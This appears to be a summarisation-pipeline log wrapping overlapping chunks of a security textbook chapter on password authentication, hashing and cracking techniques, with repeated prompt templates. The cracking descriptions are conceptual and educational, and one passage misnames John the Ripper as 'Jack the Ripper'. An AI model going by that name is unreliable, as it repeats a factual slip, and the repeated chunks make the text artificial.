      "Moderate: An authentication error could be expected to have a serious adverse effect. More specifically, the error might: (1) cause a significant degradation in mission capability to an extent and duration that the organization is able to per- form its primary functions, but the effectiveness of the functions is significantly reduced; (2) result in significant damage to organizational assets; (3) result in significant financial loss; or (4) result in significant harm to individuals that does not involve loss of life or serious life-threatening injuries.\n",
      "\n",
      "High: An authentication error could be expected to have a severe or cata- strophic adverse effect. The error might: (1) cause a severe degradation in or loss of mission capability to an extent and duration that the organization is not able to perform one or more of its primary functions; (2) result in major damage to organizational assets; (3) result in major financial loss to the organization or individuals; or (4) result in severe or catastrophic harm to individuals involving loss of life or serious life-threatening injuries.\n",
      "\n",
      "AreAs of risk The mapping between the potential impact and the appropriate level of assurance that is satisfactory to deal with the potential impact depends on the context. Table 3.2 shows a possible mapping for various risks that an organiza- tion may be exposed to. This table suggests a technique for doing risk assessment. For a given information system or service asset of an organization, the organization needs to determine the level of impact if an authentication failure occurs, using the categories of impact, or risk areas, that are of concern.\n",
      "\n",
      "For example, consider the potential for financial loss if there is an authentica- tion error that results in unauthorized access to a database. Depending on the nature of the database, the impact could be:\n",
      "\n",
      "Low: At worst, an insignificant or inconsequential unrecoverable financial loss to any party, or at worst, an insignificant or inconsequential organization liability.\n",
      "\n",
      "Moderate: At worst, a serious unrecoverable financial loss to any party, or a serious organization liability.\n",
      "\n",
      "High: Severe or catastrophic unrecoverable financial loss to any party; or severe or catastrophic organization liability.\n",
      "\n",
      "Table 3.2 Maximum Potential Impacts for Each Assurance Level\n",
      "\n",
      "Assurance Level Impact Profiles\n",
      "\n",
      "Potential Impact Categories for Authentication Errors\n",
      "\n",
      "1\n",
      "\n",
      "2\n",
      "\n",
      "3\n",
      "\n",
      "4\n",
      "\n",
      "Inconvenience, distress, or damage to standing or reputation\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "Financial loss or organization liability\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "Harm to organization programs or interests\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "Unauthorized release of sensitive information\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "Personal safety\n",
      "\n",
      "None\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod/ High\n",
      "\n",
      "Civil or criminal violations\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 91\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "92 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "The table indicates that if the potential impact is low, an assurance level of 1 is adequate. If the potential impact is moderate, an assurance level of 2 or 3 should be achieved. And if the potential impact is high, an assurance level of 4 should be implemented. Similar analysis can be performed for the other categories shown in the table. The analyst can then pick an assurance level such that it meets or exceeds the requirements for assurance in each of the categories listed in the table. So, for example, for a given system, if any of the impact categories has a potential impact of high, or if the personal safety category has a potential impact of moderate or high, then level 4 assurance should be implemented.\n",
      "\n",
      "3.2 PASSWORD-BASED AUTHENTICATION```\n",
      "\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Summarize the following text delimited by triple backquotes.\n",
      "The summary should contain the key points of the text and help students revise.\n",
      "```None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "Personal safety\n",
      "\n",
      "None\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod/ High\n",
      "\n",
      "Civil or criminal violations\n",
      "\n",
      "None\n",
      "\n",
      "Low\n",
      "\n",
      "Mod\n",
      "\n",
      "High\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 91\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "92 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "The table indicates that if the potential impact is low, an assurance level of 1 is adequate. If the potential impact is moderate, an assurance level of 2 or 3 should be achieved. And if the potential impact is high, an assurance level of 4 should be implemented. Similar analysis can be performed for the other categories shown in the table. The analyst can then pick an assurance level such that it meets or exceeds the requirements for assurance in each of the categories listed in the table. So, for example, for a given system, if any of the impact categories has a potential impact of high, or if the personal safety category has a potential impact of moderate or high, then level 4 assurance should be implemented.\n",
      "\n",
      "3.2 PASSWORD-BASED AUTHENTICATION\n",
      "\n",
      "A widely used line of defense against intruders is the password system. Virtually all multiuser systems, network-based servers, Web-based e-commerce sites, and other similar services require that a user provide not only a name or identifier (ID) but also a password. The system compares the password to a previously stored password for that user ID, maintained in a system password file. The password serves to authen- ticate the ID of the individual logging on to the system. In turn, the ID provides security in the following ways:\n",
      "\n",
      "The ID determines whether the user is authorized to gain access to a system. In some systems, only those who already have an ID filed on the system are allowed to gain access.\n",
      "\n",
      "The ID determines the privileges accorded to the user. A few users may have administrator or “superuser” status that enables them to read files and perform functions that are especially protected by the operating system. Some systems have guest or anonymous accounts, and users of these accounts have more limited privileges than others.\n",
      "\n",
      "The ID is used in what is referred to as discretionary access control. For exam- ple, by listing the IDs of the other users, a user may grant permission to them to read files owned by that user.\n",
      "\n",
      "The Vulnerability of Passwords\n",
      "\n",
      "In this subsection, we outline the main forms of attack against password-based authentication and briefly outline a countermeasure strategy. The remainder of Section 3.2 goes into more detail on the key countermeasures.\n",
      "\n",
      "Typically, a system that uses password-based authentication maintains a pass- word file indexed by user ID. One technique that is typically used is to store not the user’s password but a one-way hash function of the password, as described subsequently.\n",
      "\n",
      "We can identify the following attack strategies and countermeasures:\n",
      "\n",
      "Offline dictionary attack: Typically, strong access controls are used to protect the system’s password file. However, experience shows that determined hack- ers can frequently bypass such controls and gain access to the file. The attacker obtains the system password file and compares the password hashes against\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 92\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 93\n",
      "\n",
      "hashes of commonly used passwords. If a match is found, the attacker can gain access by that ID/password combination. Countermeasures include controls to prevent unauthorized access to the password file, intrusion detection measures to identify a compromise, and rapid reissuance of passwords should the pass- word file be compromised.\n",
      "\n",
      "Specific account attack: The attacker targets a specific account and submits password guesses until the correct password is discovered. The standard coun- termeasure is an account lockout mechanism, which locks out access to the account after a number of failed login attempts. Typical practice is no more than five access attempts.\n",
      "\n",
      "Popular password attack: A variation of the preceding attack is to use a popu- lar password and try it against a wide range of user IDs. A user’s tendency is to choose a password that is easily remembered; this unfortunately makes the password easy to guess. Countermeasures include policies to inhibit the selec- tion by users of common passwords and scanning the IP addresses of authenti- cation requests and client cookies for submission patterns.\n",
      "\n",
      "Password guessing against single user: The attacker attempts to gain knowl- edge about the account holder and system password policies and uses that knowledge to guess the password. Countermeasures include training in and enforcement of password policies that make passwords difficult to guess. Such policies address the secrecy, minimum length of the password, character set, prohibition against using well-known user identifiers, and length of time before the password must be changed.\n",
      "\n",
      "Workstation hijacking: The attacker waits until a logged-in workstation is unat- tended. The standard countermeasure is automatically logging the workstation out after a period of inactivity. Intrusion detection schemes can be used to detect changes in user behavior.\n",
      "\n",
      "Exploiting user mistakes: If the system assigns a password, then the user is more likely to write it down because it is difficult to remember. This situation creates the potential for an adversary to read the written password. A user may intentionally share a password, to enable a colleague to share files, for example. Also, attackers are frequently successful in obtaining passwords by using social engineering tactics that trick the user or an account manager into revealing a password. Many computer systems are shipped with preconfigured passwords for system administrators. Unless these preconfigured passwords are changed, they are easily guessed. Countermeasures include user training, intrusion detec- tion, and simpler passwords combined with another authentication mechanism. • Exploiting multiple password use: Attacks can also become much more effec- tive or damaging if different network devices share the same or a similar pass- word for a given user. Countermeasures include a policy that forbids the same or similar password on particular network devices.\n",
      "\n",
      "Electronic monitoring: If a password is communicated across a network to log on to a remote system, it is vulnerable to eavesdropping. Simple encryption will not fix this problem, because the encrypted password is, in effect, the password and can be observed and reused by an adversary.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 93\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "94 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "Despite the many security vulnerabilities of passwords, they remain the most commonly used user authentication technique, and this is unlikely to change in the foreseeable future [HERL12]. Among the reasons for the persistent popularity of passwords are the following:\n",
      "\n",
      "1. Techniques that utilize client-side hardware, such as fingerprint scanners and smart card readers, require the implementation of the appropriate user authen- tication software to exploit this hardware on both the client and server systems. Until there is widespread acceptance on one side, there is reluctance to imple- ment on the other side, so we end up with a who-goes-first stalemate.\n",
      "\n",
      "2. Physical tokens, such as smart cards, are expensive and/or inconvenient to carry around, especially if multiple tokens are needed.\n",
      "\n",
      "3. Schemes that rely on a single sign-on to multiple services, using one of the non- password techniques described in this chapter, create a single point of security risk. 4. Automated password managers that relieve users of the burden of knowing and entering passwords have poor support for roaming and synchronization across multiple client platforms, and their usability had not be adequately researched. Thus, it is worth our while to study the use of passwords for user authentication\n",
      "\n",
      "in some detail.\n",
      "\n",
      "The Use of Hashed Passwords\n",
      "\n",
      "A widely used password security technique is the use of hashed passwords and a salt value. This scheme is found on virtually all UNIX variants as well as on a number of other operating systems. The following procedure is employed (see Figure 3.3a). To load a new password into the system, the user selects or is assigned a password. This password is combined with a fixed-length salt value [MORR79]. In older imple- mentations, this value is related to the time at which the password is assigned to the user. Newer implementations use a pseudorandom or random number. The password and salt serve as inputs to a hashing algorithm to produce a fixed-length hash code. The hash algorithm is designed to be slow to execute in order to thwart attacks. The hashed password is then stored, together with a plaintext copy of the salt, in the password file for the corresponding user ID. The hashed password method has been shown to be secure against a variety of cryptanalytic attacks [WAGN00].\n",
      "\n",
      "When a user attempts to log on to a UNIX system, the user provides an ID and a password (see Figure 3.3b). The operating system uses the ID to index into the password file and retrieve the plaintext salt and the encrypted password. The salt and user-supplied password are used as input to the encryption routine. If the result matches the stored value, the password is accepted.\n",
      "\n",
      "The salt serves three purposes:\n",
      "\n",
      "It prevents duplicate passwords from being visible in the password file. Even if two users choose the same password, those passwords will be assigned different salt values. Hence, the hashed passwords of the two users will differ.\n",
      "\n",
      "It greatly increases the difficulty of offline dictionary attacks. For a salt of length b bits, the number of possible passwords is increased by a factor of 2b, increasing the difficulty of guessing a password in a dictionary attack.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 94\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 95\n",
      "\n",
      "Password\n",
      "\n",
      "Password ﬁle\n",
      "\n",
      "Salt\n",
      "\n",
      "User ID\n",
      "\n",
      "Salt Hash code\n",
      "\n",
      "Slow hash function\n",
      "\n",
      "Load\n",
      "\n",
      "(a) Loading a new password\n",
      "\n",
      "User Id\n",
      "\n",
      "Password ﬁle User ID Salt Hash code\n",
      "\n",
      "Salt\n",
      "\n",
      "Select\n",
      "\n",
      "Password\n",
      "\n",
      "Slow hash function\n",
      "\n",
      "Hashed password\n",
      "\n",
      "Compare\n",
      "\n",
      "(b) Verifying a password\n",
      "\n",
      "Figure 3.3 UNIX Password Scheme\n",
      "\n",
      "It becomes nearly impossible to find out whether a person with passwords on two or more systems has used the same password on all of them.\n",
      "\n",
      "To see the second point, consider the way that an offline dictionary attack would work. The attacker obtains a copy of the password file. Suppose first that the salt is not used. The attacker’s goal is to guess a single password. To that end, the attacker submits a large number of likely passwords to the hashing function. If any of the guesses matches one of the hashes in the file, then the attacker has found a password that is in the file. But faced with the UNIX scheme, the attacker must take\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 95\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "96 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "each guess and submit it to the hash function once for each salt value in the dictionary file, multiplying the number of guesses that must be checked.\n",
      "\n",
      "There are two threats to the UNIX password scheme. First, a user can gain access on a machine using a guest account or by some other means then run a password guessing program, called a password cracker, on that machine. The attacker should be able to check many thousands of possible passwords with little resource consumption. In addition, if an opponent is able to obtain a copy of the password file, then a cracker program can be run on another machine at leisure. This enables the opponent to run through millions of possible passwords in a reasonable period.\n",
      "\n",
      "uniX imPLementAtions Since the original development of UNIX, many imple- mentations have relied on the following password scheme. Each user selects a pass- word of up to eight printable characters in length. This is converted into a 56-bit value (using 7-bit ASCII) that serves as the key input to an encryption routine. The hash routine, known as crypt(3), is based on DES. A 12-bit salt value is used. The modified DES algorithm is executed with a data input consisting of a 64-bit block of zeros. The output of the algorithm then serves as input for a second encryption. This process is repeated for a total of 25 encryptions. The resulting 64-bit output is then translated into an 11-character sequence. The modification of the DES algo- rithm converts it into a one-way hash function. The crypt(3) routine is designed to discourage guessing attacks. Software implementations of DES are slow compared to hardware versions, and the use of 25 iterations multiplies the time required by 25.\n",
      "\n",
      "This particular implementation is now considered woefully inadequate. For example, [PERR03] reports the results of a dictionary attack using a supercomputer. The attack was able to process over 50 million password guesses in about 80 minutes. Further, the results showed that for about $10,000, anyone should be able to do the same in a few months using one uniprocessor machine. Despite its known weaknesses, this UNIX scheme is still often required for compatibility with existing account man- agement software or in multivendor environments.\n",
      "\n",
      "There are other much stronger hash/salt schemes available for UNIX. The recommended hash function for many UNIX systems, including Linux, Solaris, and FreeBSD (a widely used open source UNIX), is based on the MD5 secure hash algo- rithm (which is similar to, but not as secure as SHA-1). The MD5 crypt routine uses a salt of up to 48 bits and effectively has no limitations on password length. It produces a 128-bit hash value. It is also far slower than crypt(3). To achieve the slowdown, MD5 crypt uses an inner loop with 1000 iterations.\n",
      "\n",
      "Probably the most secure version of the UNIX hash/salt scheme was developed for OpenBSD, another widely used open source UNIX. This scheme, reported in [PROV99], uses a hash function based on the Blowfish symmetric block cipher. The hash function, called Bcrypt, is quite slow to execute. Bcrypt allows passwords of up to 55 characters in length and requires a random salt value of 128 bits, to produce a 192-bit hash value. Bcrypt also includes a cost variable; an increase in the cost vari- able causes a corresponding increase in the time required to perform a Bcyrpt hash. The cost assigned to a new password is configurable, so administrators can assign a higher cost to privileged users.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 96\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 97\n",
      "\n",
      "Password Cracking of User-Chosen Passwords\n",
      "\n",
      "trAditionAL APProAches The traditional approach to password guessing, or password cracking as it is called, is to develop a large dictionary of possible passwords and to try each of these against the password file. This means that each password must be hashed using each available salt value then compared with stored hash values. If no match is found, the cracking program tries variations on all the words in its dictionary of likely passwords. Such variations include back- ward spelling of words, additional numbers or special characters, or sequence of characters.\n",
      "\n",
      "An alternative is to trade off space for time by precomputing potential hash values. In this approach the attacker generates a large dictionary of possible pass- words. For each password, the attacker generates the hash values associated with each possible salt value. The result is a mammoth table of hash values known as a rainbow table. For example, [OECH03] showed that using 1.4 GB of data, he could crack 99.9% of all alphanumeric Windows password hashes in 13.8 seconds. This approach can be countered using a sufficiently large salt value and a sufficiently large hash length. Both the FreeBSD and OpenBSD approaches should be secure from this attack for the foreseeable future.\n",
      "\n",
      "To counter the use of large salt values and hash lengths, password crackers exploit the fact that some people choose easily guessable passwords. A particular problem is that users, when permitted to choose their own password, tend to choose short ones. [BONN12] summarizes the results of a number of studies over the past few years involving over 40 million hacked passwords, as well as their own analysis of almost 70 million anonymized passwords of Yahoo! users, and found a tendency toward six to eight characters of length and a strong dislike of non-alphanumeric characters in passwords.\n",
      "\n",
      "The analysis of the 70 million passwords in [BONN12] estimates that pass- words provide fewer than 10 bits of security against an online, trawling attack, and only about 20 bits of security against an optimal offline dictionary attack. In other words, an attacker who can manage 10 guesses per account, typically within the realm of rate-limiting mechanisms, will compromise around 1% of accounts, just as they would against random 10-bit strings. Against an optimal attacker performing unrestricted brute force and wanting to break half of all available accounts, passwords appear to be roughly equivalent to 20-bit random strings. It can be seen then that using offline search enables an adversary to break a large number of accounts, even if a significant amount of iterated hashing is used.\n",
      "\n",
      "Password length is only part of the problem. Many people, when permitted to choose their own password, pick a password that is guessable, such as their own name, their street name, a common dictionary word, and so forth. This makes the job of password cracking straightforward. The cracker simply has to test the password file against lists of likely passwords. Because many people use guessable passwords, such a strategy should succeed on virtually all systems.\n",
      "\n",
      "One demonstration of the effectiveness of guessing is reported in [KLEI90]. From a variety of sources, the author collected UNIX password files, containing nearly 14,000 encrypted passwords. The result, which the author rightly characterizes\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 97\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "98 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "as frightening, was that in all, nearly one-fourth of the passwords were guessed. The following strategy was used:\n",
      "\n",
      "1. Try the user’s name, initials, account name, and other relevant personal informa- tion. In all, 130 different permutations for each user were tried.\n",
      "\n",
      "2. Try words from various dictionaries. The author compiled a dictionary of over 60,000 words, including the online dictionary on the system itself, and various other lists as shown.\n",
      "\n",
      "3. Try various permutations on the words from step 2. This included making the first letter uppercase or a control character, making the entire word uppercase, reversing the word, changing the letter “o” to the digit “zero,” and so on. These permutations added another 1 million words to the list.\n",
      "\n",
      "4. Try various capitalization permutations on the words from step 2 that were not considered in step 3. This added almost 2 million additional words to the list.\n",
      "\n",
      "Thus, the test involved nearly 3 million words. Using the fastest processor available, the time to encrypt all these words for all possible salt values was under an hour. Keep in mind that such a thorough search could produce a success rate of about 25%, whereas even a single hit may be enough to gain a wide range of privileges on a system.\n",
      "\n",
      "Attacks that use a combination of brute-force and dictionary techniques have become common. A notable example of this dual approach is John the Ripper, an open-source password cracker first developed in 1996, and still in use [OPEN13].```\n",
      "\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Summarize the following text delimited by triple backquotes.\n",
      "The summary should contain the key points of the text and help students revise.\n",
      "```4. Try various capitalization permutations on the words from step 2 that were not considered in step 3. This added almost 2 million additional words to the list.\n",
      "\n",
      "Thus, the test involved nearly 3 million words. Using the fastest processor available, the time to encrypt all these words for all possible salt values was under an hour. Keep in mind that such a thorough search could produce a success rate of about 25%, whereas even a single hit may be enough to gain a wide range of privileges on a system.\n",
      "\n",
      "Attacks that use a combination of brute-force and dictionary techniques have become common. A notable example of this dual approach is John the Ripper, an open-source password cracker first developed in 1996, and still in use [OPEN13].\n",
      "\n",
      "modern APProAches Sadly, this type of vulnerability has not lessened in the past 25 years or so. Users are doing a better job of selecting passwords, and organiza- tions are doing a better job of forcing users to pick stronger passwords, a concept known as a complex password policy, as discussed subsequently. However, password- cracking techniques have improved to keep pace. The improvements are of two kinds. First, the processing capacity available for password cracking has increased dramatically. Now used increasingly for computing, graphics processors allow password- cracking programs to work thousands of times faster than they did just a decade ago on similarly priced PCs that used traditional CPUs alone. A PC running a single AMD Radeon HD7970 GPU, for instance, can try on average an 8.2 * 109 password combinations each second, depending on the algorithm used to scramble them [GOOD12a]. Only a decade ago, such speeds were possible only when using pricey supercomputers.\n",
      "\n",
      "The second area of improvement in password cracking is in the use of sophisti- cated algorithms to generate potential passwords. For example, [NARA05] developed a model for password generation using the probabilities of letters in natural language. The researchers used standard Markov modeling techniques from natural language processing to dramatically reduce the size of the password space to be searched.\n",
      "\n",
      "But the best results have been achieved by studying examples of actual pass- words in use. To develop techniques that are more efficient and effective than simple dictionary and brute-force attacks, researchers and hackers have studied the struc- ture of passwords. To do this, analysts need a large pool of real-word passwords to study, which they now have. The first big breakthrough came in late 2009, when an SQL injection attack against online games service RockYou.com exposed 32 million\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 98\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 99\n",
      "\n",
      "plaintext passwords used by its members to log in to their accounts [TIMM10]. Since then, numerous sets of leaked password files have become available for analysis.\n",
      "\n",
      "Using large datasets of leaked passwords as training data, [WEIR09] reports on the development of a probabilistic context-free grammar for password cracking. In this approach, guesses are ordered according to their likelihood, based on the fre- quency of their character-class structures in the training data, as well as the frequency of their digit and symbol substrings. This approach has been shown to be efficient in password cracking [KELL12, ZHAN10].\n",
      "\n",
      "[MAZU13] reports on an analysis of the passwords used by over 25,000 students at a research university with a complex password policy. The analysts used the pass- word-cracking approach introduced in [WEIR09]. They used a database consisting of a collection of leaked password files, including the RockYou file. Figure 3.4 sum- marizes a key result from the paper. The graph shows the percentage of passwords that have been recovered as a function of the number of guesses. As can be seen, over 10% of the passwords are recovered after only 1010 guesses. After 1013 guesses, almost 40% of the passwords are recovered.\n",
      "\n",
      "Password File Access Control\n",
      "\n",
      "One way to thwart a password attack is to deny the opponent access to the password file. If the hashed password portion of the file is accessible only by a privileged user, then the opponent cannot read it without already knowing the password of a privi- leged user. Often, the hashed passwords are kept in a separate file from the user IDs, referred to as a shadow password file. Special attention is paid to making the shadow\n",
      "\n",
      "50%\n",
      "\n",
      "40%\n",
      "\n",
      "d e s s e u g\n",
      "\n",
      "30%\n",
      "\n",
      "t n e c r e P\n",
      "\n",
      "20%\n",
      "\n",
      "10%\n",
      "\n",
      "0%\n",
      "\n",
      "104\n",
      "\n",
      "107\n",
      "\n",
      "1010\n",
      "\n",
      "1013\n",
      "\n",
      "Number of guesses\n",
      "\n",
      "Figure 3.4 The Percentage of Passwords Guessed After a Given Number of Guesses\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 99\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "100 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "password file protected from unauthorized access. Although password file protection is certainly worthwhile, there remain vulnerabilities:\n",
      "\n",
      "Many systems, including most UNIX systems, are susceptible to unanticipated break-ins. A hacker may be able to exploit a software vulnerability in the oper- ating system to bypass the access control system long enough to extract the password file. Alternatively, the hacker may find a weakness in the file system or database management system that allows access to the file.\n",
      "\n",
      "An accident of protection might render the password file readable, thus com- promising all the accounts.\n",
      "\n",
      "Some of the users have accounts on other machines in other protection domains, and they use the same password. Thus, if the passwords could be read by anyone on one machine, a machine in another location might be compromised.\n",
      "\n",
      "A lack of, or weakness in, physical security may provide opportunities for a hacker. Sometimes, there is a backup to the password file on an emergency repair disk or archival disk. Access to this backup enables the attacker to read the password file. Alternatively, a user may boot from a disk running another operating system such as Linux and access the file from this OS.\n",
      "\n",
      "Instead of capturing the system password file, another approach to collecting user IDs and passwords is through sniffing network traffic.\n",
      "\n",
      "Thus, a password protection policy must complement access control measures with techniques to force users to select passwords that are difficult to guess.\n",
      "\n",
      "Password Selection Strategies\n",
      "\n",
      "When not constrained, many users choose a password that is too short or too easy to guess. At the other extreme, if users are assigned passwords consisting of eight randomly selected printable characters, password cracking is effectively impossible. But it would be almost as impossible for most users to remember their passwords. Fortunately, even if we limit the password universe to strings of char- acters that are reasonably memorable, the size of the universe is still too large to permit practical cracking. Our goal, then, is to eliminate guessable passwords while allowing the user to select a password that is memorable. Four basic techniques are in use:\n",
      "\n",
      "User education\n",
      "\n",
      "Computer-generated passwords\n",
      "\n",
      "Reactive password checking\n",
      "\n",
      "Complex password policy\n",
      "\n",
      "Users can be told the importance of using hard-to-guess passwords and can be provided with guidelines for selecting strong passwords. This user education strategy is unlikely to succeed at most installations, particularly where there is a large user population or a lot of turnover. Many users will simply ignore the guidelines. Others may not be good judges of what is a strong password. For example, many users (mis- takenly) believe that reversing a word or capitalizing the last letter makes a password unguessable.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 100\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 101\n",
      "\n",
      "Nonetheless, it makes sense to provide users with guidelines on the selection of passwords. Perhaps the best approach is the following advice: A good technique for choosing a password is to use the first letter of each word of a phrase. How- ever, do not pick a well-known phrase like “An apple a day keeps the doctor away” (Aaadktda). Instead, pick something like “My dog’s first name is Rex” (MdfniR) or “My sister Peg is 24 years old” (MsPi24yo). Studies have shown users can generally remember such passwords, but they are not susceptible to password guessing attacks based on commonly used passwords.\n",
      "\n",
      "Computer-generated passwords also have problems. If the passwords are quite random in nature, users will not be able to remember them. Even if the password is pronounceable, the user may have difficulty remembering it and so be tempted to write it down. In general, computer-generated password schemes have a history of poor accep- tance by users. FIPS 181 defines one of the best-designed automated password genera- tors. The standard includes not only a description of the approach but also a complete listing of the C source code of the algorithm. The algorithm generates words by forming pronounceable syllables and concatenating them to form a word. A random number gen- erator produces a random stream of characters used to construct the syllables and words. A reactive password checking strategy is one in which the system periodically runs its own password cracker to find guessable passwords. The system cancels any passwords that are guessed and notifies the user. This tactic has a number of draw- backs. First, it is resource intensive if the job is done right. Because a determined opponent who is able to steal a password file can devote full CPU time to the task for hours or even days, an effective reactive password checker is at a distinct disadvan- tage. Furthermore, any existing passwords remain vulnerable until the reactive pass- word checker finds them. A good example is the openware Jack the Ripper password cracker (openwall.com/john/pro/), which works on a variety of operating systems.\n",
      "\n",
      "A promising approach to improved password security is a complex password policy, or proactive password checker. In this scheme, a user is allowed to select his or her own password. However, at the time of selection, the system checks to see if the password is allowable and, if not, rejects it. Such checkers are based on the philosophy that, with sufficient guidance from the system, users can select memorable passwords from a fairly large password space that are not likely to be guessed in a dictionary attack. The trick with a proactive password checker is to strike a balance between user acceptability and strength. If the system rejects too many passwords, users will com- plain that it is too hard to select a password. If the system uses some simple algorithm to define what is acceptable, this provides guidance to password crackers to refine their guessing technique. In the remainder of this subsection, we will look at possible approaches to proactive password checking.\n",
      "\n",
      "ruLe enforcement The first approach is a simple system for rule enforcement. For example, NIST SP 800-63-2 suggests the following alternative rules:\n",
      "\n",
      "Password must have at least sixteen characters (basic16).\n",
      "\n",
      "Password must have at least eight characters including an uppercase and lowercase letter, a symbol, and a digit. It may not contain a dictionary word (comprehensive8).\n",
      "\n",
      "Although NIST considers basic16 and comprehensive8 equivalent, [KELL12] found that basic16 is superior against large numbers of guesses. Combined with a\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 101\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "102 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "prior result that basic16 is also easier for users [KOMA11], this suggests basic16 is the better policy choice.\n",
      "\n",
      "Although this approach is superior to simply educating users, it may not be suf- ficient to thwart password crackers. This scheme alerts crackers as to which passwords not to try, but may still make it possible to do password cracking.\n",
      "\n",
      "The process of rule enforcement can be automated by using a proactive pass- word checker, such as the openware pam_passwdqc (openwall.com/passwdqc/), which enforces a variety of rules on passwords and is configurable by the system administrator.\n",
      "\n",
      "PAssword checker Another possible procedure is simply to compile a large dic- tionary of possible “bad” passwords. When a user selects a password, the system checks to make sure that it is not on the disapproved list. There are two problems with this approach:\n",
      "\n",
      "Space: The dictionary must be very large to be effective. • Time: The time required to search a large dictionary may itself be large. In addi- tion, to check for likely permutations of dictionary words, either those words must be included in the dictionary, making it truly huge, or each search must also involve considerable processing.\n",
      "\n",
      "BLoom fiLter A technique [SPAF92a, SPAF92b] for developing an effective and efficient proactive password checker that is based on rejecting words on a list has been implemented on a number of systems, including Linux. It is based on the use of a Bloom filter [BLOO70]. To begin, we explain the operation of the Bloom filter. A Bloom filter of order k consists of a set of k independent hash functions H1(x), H2(x), c , Hk(x), where each function maps a password into a hash value in the range 0 to N - 1. That is,\n",
      "\n",
      "Hi(Xj) = y 1 … i … k; 1 … j … D; 0 … y … N - 1\n",
      "\n",
      "where\n",
      "\n",
      "Xj = jth word in password dictionary\n",
      "\n",
      "D = number of words in password dictionary\n",
      "\n",
      "The following procedure is then applied to the dictionary:\n",
      "\n",
      "1. A hash table of N bits is defined, with all bits initially set to 0. 2. For each password, its k hash values are calculated, and the corresponding bits in the hash table are set to 1. Thus, if Hi (Xj) = 67 for some (i, j), then the sixty-seventh bit of the hash table is set to 1; if the bit already has the value 1, it remains at 1.\n",
      "\n",
      "When a new password is presented to the checker, its k hash values are calcu- lated. If all the corresponding bits of the hash table are equal to 1, then the password is rejected. All passwords in the dictionary will be rejected. But there will also be some “false positives” (i.e., passwords that are not in the dictionary but that produce a match in the hash table). To see this, consider a scheme with two hash functions. Suppose the passwords undertaker and hulkhogan are in the dictionary, but xG%#jj98 is not. Further suppose that\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 102\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.2 / PAssWoRD-BAsED AUTHEnTiCATion 103\n",
      "\n",
      "H1(undertaker) = 25 H1 (hulkhogan) = 83 H1 (xG%#jj98) = 665 H2(undertaker) = 998 H2 (hulkhogan) = 665 H2 (xG%#jj98) = 998\n",
      "\n",
      "If the password xG%#jj98 is presented to the system, it will be rejected even though it is not in the dictionary. If there are too many such false positives, it will be difficult for users to select passwords. Therefore, we would like to design the hash scheme to minimize false positives. It can be shown that the probability P of a false positive can be approximated by\n",
      "\n",
      "P ≈ (1 - e-kD/N)k = (1 - e-k/R)k\n",
      "\n",
      "or, equivalently,\n",
      "\n",
      "R ≈\n",
      "\n",
      "k ln(1 - p1/k)\n",
      "\n",
      "where\n",
      "\n",
      "k = number of hash functions N = number of bits in hash table D = number of words in dictionary R = N/D, ratio of hash table size (bits) to dictionary size (words)\n",
      "\n",
      "Figure 3.5 plots P as a function of R for various values of k. Suppose we have a dictionary of 1 million words, and we wish to have a 0.01 probability of rejecting a\n",
      "\n",
      "1\n",
      "\n",
      "0.1\n",
      "\n",
      "2 hash functions\n",
      "\n",
